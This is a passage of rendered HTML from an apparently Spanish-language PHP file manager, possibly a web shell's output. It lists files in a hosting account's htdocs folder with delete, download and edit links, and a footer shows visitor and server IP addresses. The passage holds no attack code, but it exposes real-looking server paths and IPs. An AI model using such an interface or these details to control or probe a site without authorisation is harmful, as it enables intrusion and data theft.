                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::staff.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagcloud.php">tagcloud.php</a></td>
                    <td>Archivo</td>
                    <td>10.53 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagcloud.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagcloud.php::tagcloud.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagcloud.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagss.php">tagss.php</a></td>
                    <td>Archivo</td>
                    <td>50.48 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagss.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagss.php::tagss.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagss.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::terminos-y-condiciones.php">terminos-y-condiciones.php</a></td>
                    <td>Archivo</td>
                    <td>34.16 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/terminos-y-condiciones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/terminos-y-condiciones.php::terminos-y-condiciones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::terminos-y-condiciones.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::top.php">top.php</a></td>
                    <td>Archivo</td>
                    <td>32.88 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/top.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/top.php::top.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::top.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::trabajo.php">trabajo.php</a></td>
                    <td>Archivo</td>
                    <td>3.59 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/trabajo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/trabajo.php::trabajo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::trabajo.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ultimos_comentarios.php">ultimos_comentarios.php</a></td>
                    <td>Archivo</td>
                    <td>899 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ultimos_comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ultimos_comentarios.php::ultimos_comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ultimos_comentarios.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::usuarios.php">usuarios.php</a></td>
                    <td>Archivo</td>
                    <td>21.93 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/usuarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/usuarios.php::usuarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::usuarios.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::votar.php">votar.php</a></td>
                    <td>Archivo</td>
                    <td>2.71 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/votar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/votar.php::votar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::votar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::x.php">x.php</a></td>
                    <td>Archivo</td>
                    <td>10.22 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/x.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/x.php::x.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::x.php">Editar</a>
                    </td>
                    </tr></table><div id="pie">
    <div id="pie_logo"></div><a id="servidor" href="http://189.245.74.75/">Tu IP: 189.245.74.75</a>
    <a id="servidor" href="http://209.190.85.12/">IP del servidor: 209.190.85.12</a>
    <span id="carga" href="#">0.458 seg</span>
    </div> 